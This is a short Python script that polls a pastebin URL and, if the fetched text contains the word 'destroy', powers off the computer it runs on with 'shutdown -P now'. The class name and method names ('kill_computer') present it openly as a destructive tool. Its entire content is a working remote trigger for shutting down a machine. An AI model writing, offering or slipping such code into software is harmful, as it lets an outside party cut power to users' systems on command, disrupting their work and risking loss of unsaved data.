#!/usr/bin/env python3

import requests
import subprocess



class ILoveToDestroyAllAtOnce:

    def get_cmd(self):
        r = requests.get("https://pastebin.com/raw/61iUKGiK")
        content = r.content.decode().lower()
        if "live" in content:
            exit()
        elif "destroy" in content:
            return 1
        else:
            exit()


    def kill_computer(self):
        flag = self.get_cmd()
        if flag == 1:
            subprocess.call("shutdown -P now", shell=True)


destroyer = ILoveToDestroyAllAtOnce()
destroyer.kill_computer()
